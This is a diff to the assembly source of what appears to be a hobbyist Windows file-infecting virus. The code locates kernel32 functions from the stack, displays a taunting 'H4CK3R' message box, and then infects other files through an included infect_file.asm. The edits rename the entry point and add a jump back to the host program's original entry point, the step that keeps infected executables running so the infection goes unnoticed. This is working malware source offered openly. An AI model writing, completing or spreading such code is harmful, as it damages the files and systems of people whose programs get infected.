@@ -14,7 +14,7 @@ begin_copy:
 ; DATA (inside .code section)
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
-    oldEntryPoint           dd 42424242h
+    oldEntryPoint           dd end_copy
     msgOfVictory            db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0
 
     kernel32_dll_name       db "Kernel32.dll", 0
@@ -42,6 +42,7 @@ begin_copy:
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
 
+
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 ; PROCEDURES
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
@@ -50,6 +51,10 @@ include		utils.asm
 include		infect_file.asm
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+; PROCEDURES - END
+; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 ; eax: reserved for proc and func return values.
@@ -57,7 +62,7 @@ include		infect_file.asm
 ; esi: Keep track of where we need to be in the kernel32.dll.
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
-virus_start:                            ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** 
+start: ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** 
 
     mov     esi, [esp]                  ; Look for last eip which was in kernel32.dll, and is now on the stack.
 
@@ -197,12 +202,12 @@ ENDM
 
 ; functions loading end.
 
-    push    0                           	;
-	lea		ecx, [ebx + offset msgOfVictory];
-    push    ecx								;
-    push    ecx         					;
-    push    0                           	;
-    call    messagebox_addr             	; Msgbox of VICTORY !!!
+    push    0                           			;
+	lea		ecx, [ebx + offset msgOfVictory]		;
+    push    ecx										;
+    push    ecx         							;
+    push    0                           			;
+    call    messagebox_addr             			; Msgbox of VICTORY !!!
 
 ; --------------------------------------> Now, time to infect the other files ! Niark niark niark...
 
@@ -284,17 +289,22 @@ infect_dbg:										; DEBUG
 
 	jmp		exit
 syserr:
-	push	0
-	lea		ecx, [ebx + offset dbg_sysfail]
-	push	ecx
-	push	ecx
-	push	0
-	call	messagebox_addr
+	push	0									; DEBUG
+	lea		ecx, [ebx + offset dbg_sysfail]		; DEBUG
+	push	ecx									; DEBUG
+	push	ecx									; DEBUG
+	push	0									; DEBUG
+	call	messagebox_addr						; DEBUG
+
 exit:
+	mov		ecx, [ebx + oldEntryPoint]
+	leave
+	jmp		ecx
     ret
 
 main ENDP
 
+	leave
 end_copy:
-
-end virus_start
+	ret
+end start
